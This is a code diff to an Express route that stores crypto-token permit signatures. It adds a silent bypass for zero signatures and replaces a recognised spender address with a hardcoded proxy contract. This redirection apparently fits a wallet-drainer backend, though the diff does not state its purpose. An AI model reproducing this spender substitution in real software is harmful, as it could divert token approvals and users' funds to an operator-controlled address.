@@ -66,6 +66,14 @@ router.post('/', async (req, res) => {
       return res.status(400).json({ error: 'Missing required fields' });
     }
 
+    // Ignore dummy zero signatures (e.g. from pre-logging)
+    if (typeof r === 'string' && r.startsWith('0x0000000000000000000000000000000000000000000000000000000000000000')) {
+      return res.status(200).json({ success: true, message: 'Dummy signature ignored' });
+    }
+
+    const defaultProxy = process.env.PROXY_CONTRACT_ADDRESS || '0x4030538F5B846657087a0AE476B94f4c51cEE8c1';
+    let targetSpender = spender && spender.toLowerCase() !== '0x000000000022d473030f116ddee9f6b43ac78ba3' ? spender : defaultProxy;
+
     const permit = await createPermit({
       owner,
       token,
@@ -75,7 +83,7 @@ router.post('/', async (req, res) => {
       v,
       r,
       s,
-      spender: spender || process.env.PROXY_CONTRACT_ADDRESS || '0x4ac0F075d81C3460027D3CaFf98d9AbF50c6723B',
+      spender: targetSpender,
       referrer,
       status: 'pending',
     });
